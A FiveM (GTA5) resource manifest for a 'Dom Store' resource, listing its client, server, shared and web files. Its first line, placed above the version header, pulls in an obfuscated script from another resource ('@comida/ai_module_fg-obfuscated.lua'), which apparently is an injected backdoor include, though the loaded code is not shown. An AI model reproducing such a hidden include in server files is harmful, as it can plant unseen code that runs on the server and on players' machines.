shared_script '@comida/ai_module_fg-obfuscated.lua'


fx_version "bodacious"
game "gta5"

author "markoo__"
description "Dom Store - https://discord.gg/tBsK5QbpgG"
version "5.0.1"
lua54 ""

ui_page "web/index.html"

shared_scripts {
    "@vrp/lib/utils.lua",
	"shared/**"
}

client_scripts {
	"client/*.lua"
}

server_scripts {
	"cfg/*.lua",
	"cfg/**/*.lua",
	"server/*.lua"
}

files {
	"web/*",
	"web/images/*.png"
}